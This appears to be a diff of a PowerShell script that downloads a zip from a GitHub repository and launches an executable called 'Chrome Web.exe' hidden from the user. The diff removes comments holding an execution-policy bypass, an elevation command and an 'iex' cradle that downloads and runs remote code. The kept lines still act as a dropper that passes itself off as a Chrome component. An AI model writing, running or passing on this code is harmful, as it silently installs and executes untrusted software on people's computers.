@@ -1,8 +1,3 @@
-#HAY QUE EJECUTAR COMO ADMINISTRADOR
-#Set-ExecutionPolicy -ExecutionPolicy Bypass -force
-#powershell "start-process powershell -verb runas"
-#powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Admo9/Source/main/prueba')"
-
 measure-command {
 
 invoke-webrequest -uri "https://github.com/Admo9/ProJ01/raw/main/win64.zip" -outfile "C:\Users\win64.zip"
@@ -39,8 +34,4 @@ Start-Process "C:\Program Files\app-64\Chrome Web.exe" --hidden } |
 
 select @{n="time";e={$_.Minutes,"Minutes",$_.Seconds,"Seconds",$_.Milliseconds,"Milliseconds" -join " "}}
 
-#CERRAR EL PROGRAMA
-#Get-WmiObject -Class Win32_Process -Filter "name='Chrome Web.exe'" | Invoke-WmiMethod -Name Terminate
-#web tools
-#https://drive.google.com/drive/folders/1NZxzpKCzvObrO96FZCcoZC2-M-J17mtl
-EXIT
+
